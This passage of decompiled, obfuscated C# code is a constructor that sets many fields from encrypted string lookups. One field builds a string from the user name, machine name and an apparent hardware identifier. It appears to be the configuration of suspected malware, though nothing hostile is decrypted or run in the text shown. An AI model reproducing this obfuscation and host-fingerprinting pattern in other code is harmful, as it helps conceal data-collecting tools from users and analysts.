			MltDPGcncVSc(getString_0(107412756)),
			MltDPGcncVSc(getString_0(107412739)),
			MltDPGcncVSc(getString_0(107412662)),
			MltDPGcncVSc(getString_0(107412629)),
			MltDPGcncVSc(getString_0(107412596)),
			MltDPGcncVSc(getString_0(107413075)),
			MltDPGcncVSc(getString_0(107413042)),
			MltDPGcncVSc(getString_0(107413009)),
			MltDPGcncVSc(getString_0(107413000)),
			MltDPGcncVSc(getString_0(107412959)),
			MltDPGcncVSc(getString_0(107412882)),
			MltDPGcncVSc(getString_0(107412849)),
			MltDPGcncVSc(getString_0(107412328)),
			MltDPGcncVSc(getString_0(107412295)),
			MltDPGcncVSc(getString_0(107412254)),
			MltDPGcncVSc(getString_0(107412181)),
			MltDPGcncVSc(getString_0(107412148)),
			MltDPGcncVSc(getString_0(107412139)),
			MltDPGcncVSc(getString_0(107412106)),
			MltDPGcncVSc(getString_0(107413428)),
			MltDPGcncVSc(getString_0(107412577)),
			MltDPGcncVSc(getString_0(107412504)),
			MltDPGcncVSc(getString_0(107412491)),
			MltDPGcncVSc(getString_0(107412458)),
			MltDPGcncVSc(getString_0(107412417)),
			MltDPGcncVSc(getString_0(107412344)),
			MltDPGcncVSc(getString_0(107411799)),
			MltDPGcncVSc(getString_0(107411758)),
			MltDPGcncVSc(getString_0(107411749)),
			MltDPGcncVSc(getString_0(107413395)),
			MltDPGcncVSc(getString_0(107411708)),
			MltDPGcncVSc(getString_0(107413382)),
			MltDPGcncVSc(getString_0(107411643)),
			MltDPGcncVSc(getString_0(107411610)),
			MltDPGcncVSc(getString_0(107411569)),
			MltDPGcncVSc(getString_0(107412048)),
			MltDPGcncVSc(getString_0(107412039)),
			MltDPGcncVSc(getString_0(107411998)),
			MltDPGcncVSc(getString_0(107411965)),
			MltDPGcncVSc(getString_0(107411932)),
			MltDPGcncVSc(getString_0(107411859)),
			MltDPGcncVSc(getString_0(107411850)),
			MltDPGcncVSc(getString_0(107411297))
		};
		LnSJjOAshqQA = new List<string>
		{
			MltDPGcncVSc(ViJjhZRbVgIOJj(getString_0(107411224))),
			MltDPGcncVSc(getString_0(107411207)),
			MltDPGcncVSc(getString_0(107411114)),
			MltDPGcncVSc(getString_0(107411529)),
			MltDPGcncVSc(getString_0(107411404)),
			MltDPGcncVSc(getString_0(107411339)),
			MltDPGcncVSc(getString_0(107410702)),
			MltDPGcncVSc(getString_0(107410605)),
			MltDPGcncVSc(getString_0(107411024)),
			MltDPGcncVSc(getString_0(107410927)),
			MltDPGcncVSc(getString_0(107410834)),
			MltDPGcncVSc(getString_0(107410225)),
			MltDPGcncVSc(getString_0(107410132)),
			MltDPGcncVSc(ViJjhZRbVgIOJj(getString_0(107411224)))
		};
		kjQmlqzYIQVD = MltDPGcncVSc(getString_0(107410035));
		MWOoiLgPzdCBQo = new List<string>
		{
			MltDPGcncVSc(getString_0(107410466)),
			MltDPGcncVSc(getString_0(107409760)),
			MltDPGcncVSc(getString_0(107409566)),
			MltDPGcncVSc(getString_0(107409884)),
			MltDPGcncVSc(getString_0(107409146)),
			MltDPGcncVSc(getString_0(107409464))
		};
		WbVfESprDIGIMr = new List<string>
		{
			MltDPGcncVSc(getString_0(107409270)),
			MltDPGcncVSc(getString_0(107408697)),
			MltDPGcncVSc(getString_0(107408668))
		};
		NrawxhsOzAIQz = getString_0(107396786);
		SubKXLTzqcDNZ = getString_0(107396786);
		mgYOvqlfZDKvpJ = new DateTime(2000, 1, 1);
		MnSlupSrQos = new DateTime(2100, 1, 1);
		umFlqTFDrugp = getString_0(107396781);
		zOOQvKyLYnQmc = getString_0(107391570);
		tHrCgDAEpchMxMr = getString_0(107396786);
		QoEGLatKrBZ = getString_0(107396786);
		hlpxkGGISuF = getString_0(107396786);
		XRVywcYmctjU = getString_0(107396781);
		cdDxujvfRDO = getString_0(107396786);
		sSOzpOZGePD = getString_0(107396786);
		NKDXYpykBZuNlnjW = new List<string>
		{
			getString_0(107396187),
			getString_0(107395421),
			getString_0(107395741),
			getString_0(107395302)
		};
		KuTrHyLgjDea = getString_0(107396786);
		hexLNfZyLAAt = getString_0(107408607);
		MGMExOrbEv = getString_0(107396786);
		bIpQDZdlBgurHV = getString_0(107396786);
		oOmCynVQoM = getString_0(107396786);
		TilgfTEpILCaO = string.Empty;
		RIVvDCRBcHrYt = getString_0(107396786);
		fPUoEcyqPYJMVGd = getString_0(107396786);
		XQKpNCddgZGKhC = getString_0(107396786);
		znnKVcnXEHpPy = getString_0(107393351);
		NXuQNXntZvLVq = getString_0(107393351);
		TDxuVyPwbBj = getString_0(107396786);
		HPEDryAlPWjplq = getString_0(107396786);
		exDowJXfwP = getString_0(107396781);
		fGJDSwwdvgHFNDo = getString_0(107396786);
		jNHTVHZBqZlXY = getString_0(107396786);
		BgFaLdyeGlB = getString_0(107408570);
		DgompREYCe = getString_0(107396786);
		GGjuftJCOHv = getString_0(107396786);
		EmovXGjNZgfAuW = getString_0(107408585);
		flDWlzyqRqaM = getString_0(107396786);
		YWRvYpdfqcy = getString_0(107396786);
		PRWcDTormIRYwd = getString_0(107396786);
		TwHrxYgsbbSNIL = getString_0(107396786);
		ekBBOoHwkxPOdO = getString_0(107408532);
		JMFuVgrABKcvSn = getString_0(107396781);
		qQMhwDGNyHmDk = getString_0(107396786);
		IfZSwTCiCwClBo = getString_0(107396786);
		EklUJCblWElDEp = getString_0(107396786);
		gKargFodTWtGS = new string[0];
		BfbuIxbfjKDpupL = getString_0(107396781);
		BFsJeResSpJpbjH = true;
		PKcodnoXFTDNrFzp = getString_0(107396786);
		mcFzFNtJADHq = false;
		zVPjqhCrCSeYyi = false;
		MLHercclrEwK = false;
		loxxIMhUDXkV = true;
		wYgKBMneFetPI = getString_0(107408551);
		VZbRouVLPuojXZ = false;
		pywYSNkaxscgqyhR = false;
		tyzdftzBVGyaYiNXV = false;
		CUaMwlrEkxsAzb = false;
		rdRqmOAazIcaE = true;
		xIWOyCueaqUo = getString_0(107408498) + Environment.UserName + getString_0(107408517) + Environment.MachineName + getString_0(107408976) + IknfuhEjRGfqaq.CnslaQynQWw() + getString_0(107409003);
		HtXiXyicpuRZSGm = false;
		eDKncBVMTmx = new Stopwatch();
		iMHVeSscbXPhxV = 0;
		qmtbLhoLXOw = 0;
		QLNkNOgrJAesSS = true;
		fCxIrHTFLNIsbC = getString_0(107408994) + IknfuhEjRGfqaq.CnslaQynQWw() + getString_0(107408953);
	}
}
